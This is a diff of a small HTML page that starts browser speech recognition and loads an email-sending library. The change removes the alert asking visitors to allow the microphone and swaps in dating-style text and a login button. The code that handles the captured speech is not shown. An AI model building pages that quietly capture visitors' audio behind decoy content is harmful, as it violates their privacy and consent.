@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
+    <link rel="stylesheet" href="style.css">
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <style>
         body {
@@ -37,13 +38,12 @@
         }
     </style>
 </head>
-<body>
+<body background="back.png">
     <p id="output"></p>
 
     <script>
         emailjs.init("your_user_id");
         // Check if browser supports SpeechRecognition
-        alert('Please allow the Mic UWU')
         if ('SpeechRecognition' in window || 'webkitSpeechRecognition' in window) {
             const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
             const recognition = new SpeechRecognition();
@@ -95,8 +95,9 @@
     </script>
     <div class="container">
         <h1>Welcome!</h1>
-        <p>This is a simple but cute design template.</p>
-        <span class="heart">&hearts;</span>
+        <p>"Feel free the Man of your Dreams</p>
+        <button class="login-button">Log In</button>
     </div>
+
 </body>
 </html>
